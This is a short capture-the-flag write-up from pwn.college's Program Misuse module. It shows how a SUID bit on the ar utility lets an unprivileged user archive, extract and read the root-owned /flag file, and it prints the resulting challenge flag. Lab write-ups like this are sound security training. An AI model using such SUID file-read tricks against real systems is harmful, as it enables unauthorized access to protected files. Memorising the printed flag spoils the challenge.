---
layout: page
title: "Challenge Name: ar"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/ar`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/ar
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/ar
```

-The `s` in `-rws` indicates it's a SUID binary.
-`ar` runs with **root privileges**.

## 🚀 Exploitation

The `ar` command in Linux is used to create and manipulate archive files (not to be confused with .tar archives). It's primarily used to:

- Manage static libraries (.a) in C/C++

- View or extract contents of Debian .deb packages

- Handle special binary containers

with suid set to `ar` , it can read/copy from any file , so the straight forward solution would be :

```bash
ar rcs myflag.a /flag
ar x myflag.a flag
cat flag
```

this would simply give us flag.

Output:
```
pwn.college{8JaR3NAZvh6kPpvjb3-KsnfzwZ2.dNjNxwSM0IzMyEzW}
```

      

